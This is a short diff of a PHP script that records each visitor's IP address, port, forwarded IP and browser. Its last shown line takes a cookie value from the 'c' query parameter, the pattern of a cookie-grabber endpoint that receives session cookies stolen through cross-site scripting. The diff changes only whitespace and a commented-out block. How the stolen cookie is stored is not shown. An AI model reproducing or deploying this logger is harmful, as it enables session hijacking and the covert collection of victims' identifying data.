@@ -2,9 +2,8 @@
 /*
 PHP Old style since 2008
 by: Os555
-
-
 */
+
 $ip = getEnv( "REMOTE_ADDR" ); 
     $port = getEnv("REMOTE_PORT"); 
     $realip = getenv("HTTP_X_FORWARDED_FOR"); 
@@ -105,15 +104,7 @@ $ip = getEnv( "REMOTE_ADDR" );
     elseif (preg_match("/Galeon/i",$var)) $temp = 'Galeon'; 
     elseif (preg_match("/Konqueror/i",$var)) $temp = 'Konqueror'; 
     else $temp = $var2; 
-/*
-$ip0="Your IP : $ip"; 
-$port0="Your Port : $port"; 
-$rip0="Your Real IP : $rip"; 
-$os="Your OS : $temp0"; 
-$br="Your Browser : $temp"; 
-$sw="IP/OS/Browser Info"; 
-$sw2="Detection os/browser By LaoZaa TeAm"; 
-*/
+
 
 //original
 $cookie = $_GET['c'];
